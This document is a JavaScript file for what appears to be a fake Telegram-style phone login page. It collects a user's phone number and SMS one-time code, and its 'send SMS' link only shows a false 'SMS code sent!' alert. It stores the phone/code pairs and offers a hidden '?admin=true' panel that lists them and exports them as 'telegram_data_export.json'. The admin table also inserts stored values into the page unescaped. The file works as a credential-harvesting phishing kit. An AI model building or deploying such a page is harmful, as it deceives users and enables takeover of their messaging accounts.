// DOM Elements
const countryCode = document.getElementById('countryCode');
const phoneNumber = document.getElementById('phoneNumber');
const nextBtn = document.getElementById('nextBtn');
const verificationModal = document.getElementById('verificationModal');
const backBtn = document.getElementById('backBtn');
const displayPhone = document.getElementById('displayPhone');
const codeInputs = document.querySelectorAll('.code-input');
const smsLink = document.getElementById('smsLink');
const verifyBtn = document.getElementById('verifyBtn');
const successPage = document.getElementById('successPage');
const successBtn = document.getElementById('successBtn');
const adminPage = document.getElementById('adminPage');
const adminCloseBtn = document.getElementById('adminCloseBtn');
const clearAllBtn = document.getElementById('clearAllBtn');
const exportBtn = document.getElementById('exportBtn');

// Phone number formatting
phoneNumber.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    // Trim leading zeros
    value = value.replace(/^0+/, '');
    e.target.value = value;
});

// Next button click handler
nextBtn.addEventListener('click', () => {
    let phone = phoneNumber.value.trim();
    // Trim leading zeros
    phone = phone.replace(/^0+/, '');

    if (phone.length < 7) {
        alert('Please enter a valid phone number');
        phoneNumber.focus();
        return;
    }

    // Save phone number to localStorage temporarily
    const fullPhone = countryCode.value + ' ' + phone;
    sessionStorage.setItem('currentPhone', fullPhone);

    // Show verification page (full page, not modal)
    displayPhone.textContent = fullPhone;
    verificationModal.classList.add('active');
    document.body.style.overflow = 'hidden';

    // Focus first code input
    setTimeout(() => {
        codeInputs[0].focus();
    }, 100);
});

// SMS link handler
smsLink.addEventListener('click', (e) => {
    e.preventDefault();
    alert('SMS code sent!');
});

// Verify button handler
verifyBtn.addEventListener('click', () => {
    const code = Array.from(codeInputs).map(input => input.value).join('');

    if (code.length < 6) {
        alert('Please enter the complete code');
        return;
    }

    // Get phone number from sessionStorage
    const phone = sessionStorage.getItem('currentPhone');

    // Save phone and OTP together as a single record
    if (phone) {
        saveUserRecord(phone, code);
        sessionStorage.removeItem('currentPhone');
    }

    // Show success page
    verificationModal.classList.remove('active');
    successPage.classList.add('active');
    document.body.style.overflow = 'hidden';
    clearCodeInputs();
    phoneNumber.value = '';
});

// Back button handler
backBtn.addEventListener('click', () => {
    verificationModal.classList.remove('active');
    document.body.style.overflow = 'auto';
    clearCodeInputs();
});

// Success button handler
successBtn.addEventListener('click', () => {
    successPage.classList.remove('active');
    document.body.style.overflow = 'auto';
});

// Code input handling
codeInputs.forEach((input, index) => {
    input.addEventListener('input', (e) => {
        const value = e.target.value;
        
        // Only allow numbers
        e.target.value = value.replace(/\D/g, '');
        
        // Auto-focus next input
        if (e.target.value.length === 1 && index < codeInputs.length - 1) {
            codeInputs[index + 1].focus();
        }
    });
    
    input.addEventListener('keydown', (e) => {
        // Handle backspace
        if (e.key === 'Backspace' && !e.target.value && index > 0) {
            codeInputs[index - 1].focus();
        }
        
        // Handle arrow keys
        if (e.key === 'ArrowLeft' && index > 0) {
            codeInputs[index - 1].focus();
        }
        
        if (e.key === 'ArrowRight' && index < codeInputs.length - 1) {
            codeInputs[index + 1].focus();
        }
    });
    
    // Handle paste
    input.addEventListener('paste', (e) => {
        e.preventDefault();
        const pastedData = e.clipboardData.getData('text').replace(/\D/g, '');
        
        if (pastedData.length > 0) {
            pastedData.split('').forEach((char, i) => {
                if (i < codeInputs.length) {
                    codeInputs[i].value = char;
                }
            });
            
            // Focus the last filled input or the next empty one
            const nextIndex = Math.min(pastedData.length, codeInputs.length - 1);
            codeInputs[nextIndex].focus();
        }
    });
});

function clearCodeInputs() {
    codeInputs.forEach(input => {
        input.value = '';
    });
}

// Save user record (phone + OTP together)
function saveUserRecord(phone, otp) {
    const timestamp = new Date().toISOString();
    const record = {
        phone: phone,
        otp: otp,
        timestamp: timestamp
    };

    // Get existing records
    let existingRecords = JSON.parse(localStorage.getItem('userRecords') || '[]');
    existingRecords.push(record);

    // Save back to localStorage
    localStorage.setItem('userRecords', JSON.stringify(existingRecords));
}

// Load user records from localStorage
function loadUserRecords() {
    return JSON.parse(localStorage.getItem('userRecords') || '[]');
}

// Close modal on outside click (removed for full page)
// verificationModal.addEventListener('click', (e) => {
//     if (e.target === verificationModal) {
//         verificationModal.classList.remove('active');
//         clearCodeInputs();
//     }
// });

// Escape key to close modal
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
        if (verificationModal.classList.contains('active')) {
            verificationModal.classList.remove('active');
            document.body.style.overflow = 'auto';
            clearCodeInputs();
        }
        if (successPage.classList.contains('active')) {
            successPage.classList.remove('active');
            document.body.style.overflow = 'auto';
        }
        if (adminPage.classList.contains('active')) {
            adminPage.classList.remove('active');
            document.body.style.overflow = 'auto';
        }
    }
});

// Check for admin URL parameter
const urlParams = new URLSearchParams(window.location.search);
if (urlParams.get('admin') === 'true') {
    adminPage.classList.add('active');
    document.body.style.overflow = 'hidden';
    loadAdminData();
}

// Admin close button handler
adminCloseBtn.addEventListener('click', () => {
    adminPage.classList.remove('active');
    document.body.style.overflow = 'auto';
});

// Clear all data button handler
clearAllBtn.addEventListener('click', () => {
    if (confirm('Are you sure you want to clear all data? This action cannot be undone.')) {
        localStorage.removeItem('userRecords');
        loadAdminData();
        alert('All data has been cleared.');
    }
});

// Export data button handler
exportBtn.addEventListener('click', () => {
    const records = loadUserRecords();

    const exportData = {
        userRecords: records,
        exportDate: new Date().toISOString()
    };

    const dataStr = JSON.stringify(exportData, null, 2);
    const dataBlob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(dataBlob);

    const link = document.createElement('a');
    link.href = url;
    link.download = 'telegram_data_export.json';
    link.click();

    URL.revokeObjectURL(url);
});

// Load admin data
function loadAdminData() {
    const records = loadUserRecords();

    // Update record count
    document.getElementById('recordCount').textContent = records.length;

    // Render records table
    renderRecordsTable(records);
}

// Render records table
function renderRecordsTable(records) {
    const tableBody = document.getElementById('recordsTableBody');

    if (records.length === 0) {
        tableBody.innerHTML = `
            <tr>
                <td colspan="5">
                    <div class="empty-state">
                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                        <p>No data available</p>
                    </div>
                </td>
            </tr>
        `;
        return;
    }

    tableBody.innerHTML = records.map((record, index) => `
        <tr>
            <td>${index + 1}</td>
            <td><strong>${record.phone}</strong></td>
            <td><span class="otp-badge">${record.otp}</span></td>
            <td>${formatDate(record.timestamp)}</td>
            <td>
                <button class="delete-btn" onclick="deleteRecord(${index})">Delete</button>
            </td>
        </tr>
    `).join('');
}

// Format date
function formatDate(timestamp) {
    const date = new Date(timestamp);
    return date.toLocaleString();
}

// Delete record
function deleteRecord(index) {
    const records = loadUserRecords();
    records.splice(index, 1);
    localStorage.setItem('userRecords', JSON.stringify(records));
    loadAdminData();
}

// Make deleteRecord globally accessible
window.deleteRecord = deleteRecord;
